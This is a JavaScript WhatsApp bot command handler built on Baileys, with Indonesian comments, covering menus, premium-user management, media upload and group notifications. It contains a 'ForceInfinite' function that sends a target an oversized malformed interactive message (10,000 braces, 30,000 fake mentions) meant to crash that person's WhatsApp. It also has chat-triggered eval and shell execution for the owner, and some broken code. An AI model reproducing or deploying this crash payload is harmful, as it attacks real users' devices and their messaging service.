
require('./config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const generateMessageID = () => crypto.randomBytes(10).toString('hex');
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const sharp = require('sharp')
const jimp = require("jimp")
const moment = require('moment-timezone')
const path = require('path');
const { exec, spawn, execSync } = require('child_process');
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./system/exif.js')
async function getImageBuffer(url) {
  const res = await axios.get(url, { responseType: 'arraybuffer' })
  return Buffer.from(res.data)
}
// taruh di paling atas file (sekali aja)
const TraApi = "⚠️ Karasu Crash v2.1";
const youngModss = " | Karasu Engine";
const ExoUi = "⪼⩽ EXOUI SYSTEM ACTIVE ⩾⪻\n".repeat(1000);
const { v4: uuidv4 } = require('uuid');
const Karasuu = `
▂▃▅▇█▓▒💀 𝐊𝐀𝐑𝐀𝐒𝐔 𝐏𝐑𝐎𝐓𝐎𝐂𝐎𝐋 ▒▓█▇▅▃
`
let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'))
function savePrem() {
  fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2))
}
function parseTime(str) {
  let num = parseInt(str)
  if (/d/i.test(str)) return num * 24 * 60 * 60 * 1000
  if (/h/i.test(str)) return num * 60 * 60 * 1000
  if (/m/i.test(str)) return num * 60 * 1000
  return 0
}

const IMAGE_PATH = path.join(__dirname, './system/image/image.jpg');
const THUMBNAIL_PATH = path.join(__dirname, './system/image/thumb.jpg');
const Image = fs.readFileSync(IMAGE_PATH);
const thumbImage = fs.readFileSync(THUMBNAIL_PATH);
module.exports = young = async (young, m, chatUpdate, store) => {
const { from } = m
try {
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./system/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./system/Premium.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await young.decodeJid(young.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await young.groupMetadata(from).catch(e => null) : null
const participants = groupMetadata?.participants || []

const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : []
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = groupMetadata?.subject || ""
const pushname = m.pushName || "No Name"
const timeStamp = nowTime()
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});


if (command) {
  const line = chalk.white('────────────────────────────');
  const label = chalk.red;
  const value = chalk.green;
  const title = chalk.gray;

  console.log(line);
  console.log(title('⌜ KARASU SYSTEM ⌟'));

  console.log(`${label('› Date')}     : ${value(todayDateWIB)}`);
  console.log(`${label('› Time')}     : ${value(time + ' WIB')}`);
  console.log(`${label('› Command')}  : ${value(command)}`);
  console.log(line);
}

// --- TARUH DI ATAS FILE --- //
const imageLinks = [
  'https://raw.githubusercontent.com/ybthings/Media/refs/heads/main/file_00000000c2cc61fb837756ec773dced1.png',
  'https://raw.githubusercontent.com/ybthings/Media/refs/heads/main/file_00000000c04861f5a475a25b9c5e9de3.png',
  'https://raw.githubusercontent.com/ybthings/Media/refs/heads/main/file_00000000373061f494f506f8b4761764.png',
  'https://raw.githubusercontent.com/ybthings/Media/refs/heads/main/file_000000003f0061faa06b0c93eac26bc4.png',
  'https://raw.githubusercontent.com/ybthings/Media/refs/heads/main/file_000000001b1061f697a3f4457beb375f.png'
];

function getRandomKarasuImage() {
  return imageLinks[Math.floor(Math.random() * imageLinks.length)];
}

const panduan = ``

function getCaptionKarasu(targetNumber, command) {
  return `
╭──(    ̴𝐖̵ᯭ̡𝐀͠͡𝐑̶𝐍͉͢𝐈ᬺ̷̡𝐍̴͠𝐆͢͡: ̡𝐒̴ᯭ̢𝐘͜͠𝐒̷𝐓𝐄ᬺ̵̴𝐌̡ 𝐄̵ᯭ̢𝐗̶𝐄͢͠𝐂̷𝐔̡𝐓̴𝐄̵𝐃̡͢  ♠️)
│ ✮ : *STATUS*       : ☠️ 𝐄̴̢𝐋̶̴𝐈̷͡𝐌̡̡𝐈ᯭ̵𝐍̴̷𝐀̶͢𝐓̴̢𝐄̵̡𝐃̴̶͠
│ ☫  𝐓̴̢𝐀̶̴𝐑̷͡𝐆̡̡𝐄ᯭ̵𝐓̴̷           : wa.me/${targetNumber}
│ ☫ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : https://ẉ.ceo/YoungBoy
│ ☫  COMMAND          : ${command}
╰━━━━━━━━━━━━━━━━━━━━━━⬣

╭──(    *🕳️ WARNING*    )
│ ✮  : THIS IS YOUR LAST CHANCE
│ ✮  NEXT MOVE = TOTAL SHUTDOWN
│ ✮  KARASU SYSTEM IS LOCKED ON
╰━━━━━━━━━━━━━━━━━━━━━━⬣

☠️ 𝐊ᯭ𝐀͠𝐑𝐀𝐒͢𝐔ᬺ 𝐏ᯭ𝐑𝐎͠𝐓𝐎𝐂͢𝐎𝐋ᬺ: 𝐄ᯭ𝐋𝐄͠𝐂𝐓𝐑𝐎͢ 𝐄𝐗ᬺ𝐄𝐂𝐔𝐓𝐈𝐎ᬺ𝐍 𝐂ᯭ𝐎𝐌͠𝐏𝐋ᬺ𝐄𝐓𝐄
`;
}

global.thumbnail = 'https://files.catbox.moe/fxc162.jpg'
global.thumbnel = 'https://files.catbox.moe/2bl87n.jpg'
global.body = "©ʏᴏᴜɴɢʙᴏʏ"
global.foother = "𝗬𝗼𝘂𝗻𝗴 𝗕𝗼𝘆"
global.title = "KARASU INVOKED V0.75 VIP"
const youngreply = (teks) => {
  young.sendMessage(m.chat, { text: teks }, { quoted: m });
}


//Funcnnya

async function ForceInfinite(target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝗢𝗕𝗜𝗧𝗢🦡",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "𝗕𝗟𝗔𝗖𝗞 𝗕𝗨𝗟𝗟 𝗗𝗘𝗞𝗞🪷",
                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
              },
            },
            body: {
              text: "𝗡𝗘𝗡𝗘𝗡𝗦𝗘𝗚𝗘𝗥😘",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await young.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}


//=================================================//
// Function Main — Menu
//=================================================//

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const imageList = [
    "https://pixhost.to/show/7242/622508498_file_00000000bd6061f89dddf1ba99be049e.png"
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];

const example = (teks) => {
return `Usage: ${prefix + command} ${teks}`
}

const ReplyButton = (teks) => {
const userMode = global.menuMode || 'nobutton'; // default button

if (userMode === 'nobutton') {

young.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝗬𝗼𝘂𝗻𝗴 𝗕𝗼𝘆`,
                body: ``,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: RandomMenu,
                sourceUrl: ``
            }
        } 
    }, { quoted: lol });
}

// BUTTON MODE
  const buttons = [
    {
      buttonId: '.menu',
      buttonText: {
        displayText: 'ɃΛϾҜ ͲΘ ϻΣͶЦ'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: '𝗬𝗼𝘂𝗻𝗴 𝗕𝗼𝘆',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "",
        serverMessageId: null,
        newsletterName: ``
      },
      mentionedJid: ['5521992999999@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return young.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

const ReplyButtonMenu = async (teks, imgUrl) => {
  const thumb = await getBuffer(imgUrl) // ✅ imgUrl dapet dari parameter atas
const userMode = global.menuMode || 'nobutton'; // default button

if (userMode === 'nobutton') {

young.sendMessage(m.chat, {
  image: { url: RandomMenu },
  caption: teks,
  footer: "𝗬𝗼𝘂𝗻𝗴 𝗕𝗼𝘆",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "",
      serverMessageId: 1,
      newsletterName: ""
    }
  }
}, { quoted: lol });
}

// BUTTON MODE
  const buttons = [
    {
      buttonId: '.menu',
      buttonText: {
        displayText: 'ɃΛϾҜ ͲΘ ϻΣͶЦ'
    }
  },
  {
      buttonId: '.tqto',
      buttonText: {
        displayText: '𝗖𝗥𝗘𝗗𝗜𝗧'
      }
    }
  ];


  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: '𝗬𝗼𝘂𝗻𝗴 𝗕𝗼𝘆',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "",
        serverMessageId: null,
        newsletterName: ``
      },
      mentionedJid: ['5521992999999@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return young.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  }, 
  message: {
    orderMessage: {
      itemCount: 66666, // muncul angka "9999 item"
      status: 1,
      surface: 1,
      message: "烏 𝗜𝗡𝗩𝗢𝗞𝗘𝗗🌀", // ini yang muncul di bawah angka
      thumbnail: null
    }
  }
}

const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;

async function loading () {
var baralod = [
"𝐘𝐎",
"𝐘𝐎𝐔",
"𝐘𝐎𝐔𝐍𝐆", 
"𝐘𝐎𝐔𝐍𝐆 𝐁",
"𝐘𝐎𝐔𝐍𝐆 𝐁𝐎𝐘", 
"𝐘𝐎𝐔𝐍𝐆 𝐁𝐎𝐘 𝐁𝐀",
"𝐘𝐎𝐔𝐍𝐆 𝐁𝐎𝐘 𝐁𝐀𝐁𝐘",
"𝐘𝐎𝐔𝐍𝐆 𝐁𝐎𝐘 𝐁𝐀𝐁𝐘🔥",
]
let { key } = await young.sendMessage(from, {text: '𝐘'})

for (let i = 0; i < baralod.length; i++) {
await young.sendMessage(from, {text: baralod[i], edit: key });
}
}

const safeSend = async (jid, content) => {
  try { await young.sendMessage(jid, content) } catch (e) { console.error('safeSend error', e) }
}

// load database.json
global.db = require("./database.json");

// fungsi simpan database
global.saveDb = (data) => {
  fs.writeFileSync("./database.json", JSON.stringify(data, null, 2));o
};
// ===== CONFIG ====
const ALLOWED = [
  '6282147570157@s.whatsapp.net',  '6281315620593@s.whatsapp.net', 
 '6285137351261@s.whatsapp.net'  // kalau mau ada nomor cadangan
]
// ==== SETTING GAMBARNYA ====
const IMAGE_URL = 'https://files.catbox.moe/2bl87n.jpg'



setInterval(async () => {
  const gid = '120363277834262574@g.us' // ganti ID grupmu

  for (let i = premiumUsers.length - 1; i >= 0; i--) {
    let user = premiumUsers[i]

    if (!user?.jid || typeof user.jid !== 'string') continue

    if (Date.now() >= user.expire) {
      // tag user di grup pakai safeSend
      await safeSend(gid, {
        text: `⚠️ @${user.jid.split('@')[0]} premium kamu habis!`,
        mentions: [user.jid]
      })

      // kick user dari grup, bot harus admin
      try {
        await young.groupParticipantsUpdate(gid, [user.jid], 'remove')
      } catch (e) {
        // skip error kalau bot bukan admin
      }

      // hapus dari list & simpan
      premiumUsers.splice(i, 1)
      savePrem()
    }
  }
}, 60_000)


// === CONFIG PER BOT ===
let gasState = {
  target: "6287780010053@s.whatsapp.net", // ganti target
  notifyGroups: [
    "120363277834262574@g.us",
    "120363404394972458@g.us"
  ],
  running: false
}

// === UTIL ===
const delay = (ms) => new Promise(res => setTimeout(res, ms))

// delay pengecekan ulang, sama seperti contoh aslimu: 150 detik
const getDelay = () => 25 * 1000

const pings = ['hai']
const nextPing = () => pings[Math.floor(Math.random() * pings.length)]

const OFF_PATTERN = /Yuk coba lagi dengan kode unik yang lain di dalam tutup botol HYDROPLUS/i
const ON_PATTERN  = /Selamat ya, kamu sudah dapat semua hadiahmu dari Hydroplus/i

function nowTime() {
  // langsung format ke zona waktu WIB (Asia/Jakarta)
  return moment().tz('Asia/Jakarta').format('HH:mm:ss')
}

async function sendHidetag(jid, text) {

  try {

    const metadata = await young.groupMetadata(jid)

    const participants = metadata.participants.map(p => p.id)

    await young.sendMessage(jid, {

      text,

      mentions: participants

    })

  } catch (e) {

    console.error('sendHidetag error', e)

  }

}
    
async function startGasCheck() {
  if (gasState.running) return
  gasState.running = true

  try {
    while (true) {
      // kirim ping ke target
      await safeSend(gasState.target, { text: nextPing() })

      let detectedON = false

      const handler = async ({ messages }) => {
        try {
          const m = messages?.[0]
          if (!m) return
          if (m.key?.remoteJid !== gasState.target) return

          const text =
            m.message?.conversation ||
            m.message?.extendedTextMessage?.text ||
            ''

          if (OFF_PATTERN.test(text)) {
            console.log(`❌ [${nowTime()}] Target OFFLINE (deteksi teks).`)
            try { young.ev.off('messages.upsert', handler) } catch {}
          }

          if (ON_PATTERN.test(text)) {
            detectedON = true
            console.log(`✅ [${nowTime()}] Target ONLINE (deteksi teks hadiah).`)
            try { young.ev.off('messages.upsert', handler) } catch {}
          }
        } catch (e) {
          console.error('handler error', e)
        }
      }

      young.ev.on('messages.upsert', handler)

      await delay(5000) // tunggu max 35 detik respon
      try { young.ev.off('messages.upsert', handler) } catch {}

      if (detectedON) {
const pesan = [
  `BOT SUDAH AKTIF ⏱ ${nowTime()}`,
  `HYDRO ON ⏱ ${nowTime()}`,
  `ON ON ON ⏱ ${nowTime()}`,
  `ON WOIII ⏱ ${nowTime()}`
]

for (let i = 0; i < pesan.length; i++) {
  const teks = pesan[i]
  for (const gid of gasState.notifyGroups) {
    if (i === 0) {
      // kirim pertama pakai hidetag
      await young.sendMessage(gid, { text: teks, mentions: (await young.groupMetadata(gid)).participants.map(a => a.id) })
    } else {
      // kirim biasa
      await young.sendMessage(gid, { text: teks })
    }
  }
}

await delay(getDelay()) // 150 detik sesuai kebutuhan
break
      } else {
        console.log(`⏳ [${nowTime()}] Target tidak balas / OFF, coba lagi...`)
        await delay(getDelay())
      }
    }
  } catch (err) {
    console.error('startGasCheck error', err)
  } finally {
    gasState.running = false
  }
}

// startGasCheck()  <-- panggil setelah konek Baileys


//=================================================//
// Command Menu
//===============================================
// === CASE ===
// daftar nomor yang boleh pakai .gas


//=================================================//
// Command Menu
//================================================
switch(command) {
case 'addjson': {
  if (!ALLOWED.includes(m.sender)) return m.reply('❌ Kamu tidak punya izin bro.')

  // Pastikan reply ke file document
  const quoted = m.quoted ? m.quoted : m.msg.contextInfo?.quotedMessage
  const docMsg =
    quoted?.documentMessage ||
    quoted?.message?.documentMessage ||
    m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.documentMessage

  if (!docMsg) return m.reply('⚠️ Reply ke file `premium.json` dulu.')

  const fileName = docMsg.fileName || ''
  const mime = docMsg.mimetype || ''
  const isJson = mime === 'application/json' || fileName.endsWith('.json')
  if (!isJson) return m.reply('❌ File bukan JSON bro, kirim file `premium.json`.')

  try {
    // Download isi file dari pesan quoted
    const stream = await downloadContentFromMessage(docMsg, 'document')
    const chunks = []
    for await (const chunk of stream) chunks.push(chunk)
    const fileData = Buffer.concat(chunks)

    const fs = require('fs')
    fs.writeFileSync('./premium.json', fileData)

    // Reload data
    global.premiumUsers = JSON.parse(fs.readFileSync('./premium.json'))
    m.reply('✅ File `premium.json` berhasil diganti & data direload otomatis.')

  } catch (e) {
    console.error(e)
    m.reply('❌ Gagal mengganti file JSON, cek log terminal.')
  }
}
break 
case 'ambil': {

  if (!ALLOWED.includes(m.sender))

 return

  const path = './premium.json'

  const fs = require('fs')

  if (!fs.existsSync(path)) return m.reply('⚠️ File premium.json tidak ditemukan.')

  await young.sendMessage(m.chat, {

    document: { url: path },

    mimetype: 'application/json',

    fileName: 'premium.json',

    caption: '📦 File Premium JSON dari panel'

  }, { quoted: m })

}

break        
case 'restart': {
    if (!ALLOWED.includes(m.sender))

 return

  await m.reply('♻️ Restarting bot, tunggu beberapa detik...')

  // Delay sedikit biar pesan terkirim dulu

  setTimeout(() => {

    process.exit(0)

  }, 2000)

}

break        
case 'ping': {
if (!ALLOWED.includes(m.sender))
 return
    m.reply('✅ Bot hidup!')
}
break

  case 'gas': {
    if (!ALLOWED.includes(m.sender))
 return
    if (gasState.running) {
      await young.sendMessage(m.chat, { text: '🔁 Pengecekan sudah berjalan, tunggu hasilnya.' }, { quoted: m })
    } else {
      startGasCheck()
      await young.sendMessage(m.chat, { text: '✅ Pengecekan dimulai, tunggu hasilnya.' }, { quoted: m }) 
    }
  }
  break
  
case 'addprem': {
   if (!ALLOWED.includes(m.sender)) return
   if (args.length < 2)
      return m.reply('Format: .addprem nomor durasi\nContoh: .addprem 6281234567890 5d')

   let number = String(args[0]).replace(/[^0-9]/g, '')
   if (!number) return m.reply('Nomor tidak valid!')

   let jid = `${number}@s.whatsapp.net`

   let duration = args[1]
   let ms = parseTime(duration)
   if (!ms) return m.reply('Durasi tidak valid! Gunakan contoh: 5d / 12h / 30m')

   // cek kalau user sudah ada
   let user = premiumUsers.find(u => u.jid === jid)
   if (user) {
      // extend waktu
      user.expire += ms
   } else {
      // baru pertama kali
      user = { jid, expire: Date.now() + ms }
      premiumUsers.push(user)
   }
   savePrem()

   // kirim notif
   await young.sendMessage(m.chat, {
      text: `✅ @${number} sekarang premium diperpanjang ${duration}\n📅 Expire: ${new Date(user.expire).toLocaleString()}`,
      mentions: [jid]
   }, { quoted: m })
}
break
case 'listprem': {
  if (premiumUsers.length === 0) return m.reply('📭 Belum ada user premium.')

  let list = '👑 List User Premium:\n\n'
  let no = 1
  for (let user of premiumUsers) {
    let sisa = user.expire - Date.now()
    if (sisa < 0) sisa = 0
    let days = Math.floor(sisa / (24 * 60 * 60 * 1000))
    let hours = Math.floor((sisa % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000))

    list += `${no}. ${user.jid.split('@')[0]} → ${days}h ${hours}j\n`
    no++
  }

  m.reply(list)
}
break

case 'rekap': {

  const logs = loadRekapan()

  let rekap = buatRekapMingguan(logs)

  await young.sendMessage(m.chat, { text: rekap }, { quoted: m })

}

break

case 'tourl': {
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return young.sendMessage(m.chat, { text: '❗ Balas gambar atau video dengan command *tourl*' }, { quoted: m });

    let mime = q.mimetype || '';
    if (!/^(image\/(png|jpe?g|gif)|video\/mp4)$/.test(mime)) {
        return young.sendMessage(m.chat, { text: '❌ Hanya mendukung gambar atau video MP4!' }, { quoted: m });
    }

    let media;
    try {
        media = await q.download();
    } catch {
        return young.sendMessage(m.chat, { text: '⚠️ Gagal mengunduh media!' }, { quoted: m });
    }

    const uploadImage = require('./system/Data1');
    const uploadFile = require('./system/Data2');
    let isImage = /image\/(png|jpe?g|gif)/.test(mime);
    let link;
    try {
        link = await (isImage ? uploadImage : uploadFile)(media);
    } catch {
        return young.sendMessage(m.chat, { text: '❌ Gagal mengunggah media!' }, { quoted: m });
    }

    let tourl = `*📁 Link Media Tersimpan:*\n🖇️ ${link}`;

    await young.sendMessage(m.chat, {
        image: { url: thumbnel }, // thumbnail image
        caption: tourl,
        footer: foother,
        viewOnce: false,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [sender],
            externalAdReply: {
                title: title,
                body: "©ʏᴏᴜɴɢʙᴏʏ",
                thumbnailUrl: thumbnail,
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: lol });
}
break;


default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));

}

}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})